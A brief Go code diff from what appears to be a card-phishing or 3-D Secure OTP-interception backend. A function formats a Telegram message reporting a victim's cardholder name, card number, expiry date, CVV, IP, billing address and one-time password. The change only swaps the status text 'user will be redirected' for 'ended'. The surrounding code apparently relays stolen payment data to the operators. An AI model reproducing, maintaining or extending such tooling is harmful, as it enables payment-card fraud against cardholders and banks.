@@ -677,7 +677,7 @@ func (m *ThreeDSManager) updateTelegramCompleted(sessionID string, msgID int, re
 			"🌐 IP: %s\n"+
 			"🏠 账单地址: %s\n"+
 			"%s"+
-			"⚙️ 状态: %s\n用户将被重定向",
+			"⚙️ 状态: %s\n已结束",
 		sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr, otpLine, reason,
 	)
 
